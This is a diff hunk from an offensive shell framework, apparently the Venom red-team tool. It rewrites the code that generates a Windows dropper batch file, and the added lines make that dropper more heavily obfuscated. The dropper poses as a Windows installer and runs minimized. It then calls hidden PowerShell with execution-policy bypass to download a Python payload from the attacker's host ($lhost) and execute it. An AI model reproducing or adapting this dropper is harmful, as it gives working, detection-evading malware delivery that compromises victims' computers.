@@ -10332,13 +10332,13 @@ if [ "$SOSP" = "Windows" ]; then
    if [ "$easter_egg" = "ON" ] || [ "$vbsevasion" = "ON" ]; then
       ## Build dropper.bat (IF: OBFUSCATION=ON | IF: categorie nº8 - Agent nº6)
       echo "${BlueF}[☠]${white} Creating dropper BAT Program."${Reset};sleep 2
-      echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" > $Drop.bat
-      echo ":: Framework: Venom v1.0.17 - shinigami" >> $Drop.bat
-      echo "@echo off&&title $Drop - 3.10.5-dev Windows Installer" >> $Drop.bat
-      echo "if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start \"\" /min \"%~dpnx0\" %* && exit" >> $Drop.bat
-      echo "@po%i%we^r%@%sh^e%db%ll \$C=p^i%@%p sh%@%o^w tab%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p ins%@%t^a%@%ll tab%@%u^la%@%te py%@%n^pu%@%t psu%@%t^i%@%l pi%@%l^l%@%ow pys%@%cr^ee%@%ns%@%h^ot pyi%@%ns^t%@%all%@%e^r}" >> $Drop.bat
-      echo ";pow^e%@%rs^he%@%ll -e^x%@%ec b%@%ypa^s%@%s -w 1 -C (Ne%@%W-Obj%@%ect N%i%et.WebCl%@%ie^n%@%t).Dow%@%nl^oa%@%dFil%@%e('h^t%@%t^p:/%@%/$lhost/$Drop.py', '$rpath\\$Drop.py') &%@%& (,;(c%@%d $rpath &%@%& py%@%t^h%@%on $Drop.py),)" >> $Drop.bat
-      echo "${BlueF}[☠]${white} Obfuscated $Drop.bat written to output."${Reset};sleep 2
+      echo ":: Framework: Venom v1.0.17 - shinigami" > $Drop.bat
+      echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" >> $Drop.bat
+      echo "@echo off&%@i%&title $Drop - 3.10.5-dev Windows Installer&%#i#%&set \$\$=-w 1 -C&&set \$i=py&&set '''=start" >> $Drop.bat
+      echo ",i%'$%f n%i@%ot DEF%@$%INE%@%D IS_MIN%@$%IMI%,;%ZE%i?%D se%@i%t IS_MIN%_#%IMIZ%@=i%ED=1 &%@$%& s%i0%ta%@%rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@%& ex%@$%i%_i_%t" >> $Drop.bat
+      echo "@p\"o\"%i%we^r%@%s\"h\"^e%db%ll \$C=p\"i\"%@%p sh%@%o^w t\"a\"b%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p i\"n\"s%@%t^a%@%ll t\"a\"b%@%u^la%@%te py%@%n^pu%@%t p\"s\"u%@%t^i%@%l pi%@%l^l%@%o\"w\" pys%@%cr^ee%@%ns%@%h^ot p\"y\"i%@%ns^t%@%a\"l\"l%@%e^r}" >> $Drop.bat
+      echo "=pow^e%@%rs^he%@%ll -e^x%@%e\"c\" b%@%y\"p\"a^s%@%s %\$\$% (Ne%@%W-Obj%@%ect N%i%et.WebCl%@%ie^n%@%t).Dow%@%nl^oa%@%dFil%@%e('h^t%@%t^p:/%@%/$lhost/$Drop.%\$i%', '$rpath\\$Drop.%\$i%') &%@%& (,;(c%@%d $rpath &%@%& py%@%t^h%@%on $Drop.%\$i%),)" >> $Drop.bat
+      echo "${BlueF}[☠]${white} Written $Drop.bat (Obfuscated)"${Reset};sleep 2
 
    else
 
